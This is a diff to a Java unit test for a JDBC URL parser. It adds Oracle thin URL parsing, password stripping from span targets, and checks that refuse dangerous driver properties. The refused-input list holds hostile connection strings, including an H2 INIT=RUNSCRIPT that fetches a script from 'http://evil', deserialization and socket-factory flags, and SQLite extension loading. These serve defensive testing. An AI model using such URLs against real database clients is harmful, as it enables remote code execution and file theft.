@@ -77,6 +77,14 @@ class JdbcUrlTest {
     }
 
     @Test
+    void spanTargetShouldDropThePropertiesOfAnOracleThinServiceUrl() {
+        JdbcUrl url = JdbcUrl.parse("jdbc:oracle:thin:@ora:1521/FIN?password=s3cret");
+
+        assertEquals("oracle://ora/FIN", url.spanTarget());
+        assertEquals("FIN", url.database());
+    }
+
+    @Test
     void spanTargetShouldNotReadAnUnknownShapeThatCarriesAnAt() {
         JdbcUrl url = JdbcUrl.parse("jdbc:acme:admin/s3cret@db:9999:main");
 
@@ -91,6 +99,8 @@ class JdbcUrlTest {
         assertEquals(SqlStatement.Dialect.POSTGRESQL,
                 JdbcUrl.parse("jdbc:postgresql://db/erp").dialect());
         assertEquals(SqlStatement.Dialect.SQLITE, JdbcUrl.parse("jdbc:sqlite:x.db").dialect());
+        assertEquals(SqlStatement.Dialect.ORACLE,
+                JdbcUrl.parse("jdbc:oracle:thin:@//ora:1521/FIN").dialect());
         assertEquals(SqlStatement.Dialect.STANDARD, JdbcUrl.parse("jdbc:h2:mem:x").dialect());
     }
 
@@ -116,7 +126,8 @@ class JdbcUrlTest {
         "jdbc:mariadb://db/erp?user=a&autoDeserialize=true",
         "jdbc:postgresql://db/erp?socketFactory=x.Y",
         "jdbc:postgresql://db/erp?sslfactory=x.Y",
-        "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil/x.sql'"
+        "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil/x.sql'",
+        "jdbc:sqlite:/var/data/x.db?enable_load_extension=true"
     })
     void checkShouldRefuseDangerousDriverPropertiesInTheUrl(String url) {
         IllegalArgumentException e = assertThrows(IllegalArgumentException.class,
@@ -129,6 +140,12 @@ class JdbcUrlTest {
     void checkShouldRefuseDangerousDriverPropertiesInConnectionProperties() {
         assertThrows(IllegalArgumentException.class, () -> JdbcUrl.check("erp",
                 "jdbc:mysql://db/erp", Map.of("AllowLoadLocalInfile", "true")));
+    }
+
+    @Test
+    void checkShouldRefuseSqliteExtensionLoadingInConnectionProperties() {
+        assertThrows(IllegalArgumentException.class, () -> JdbcUrl.check("erp",
+                "jdbc:sqlite:/var/data/x.db", Map.of("enable_load_extension", "true")));
     }
 
     @Test
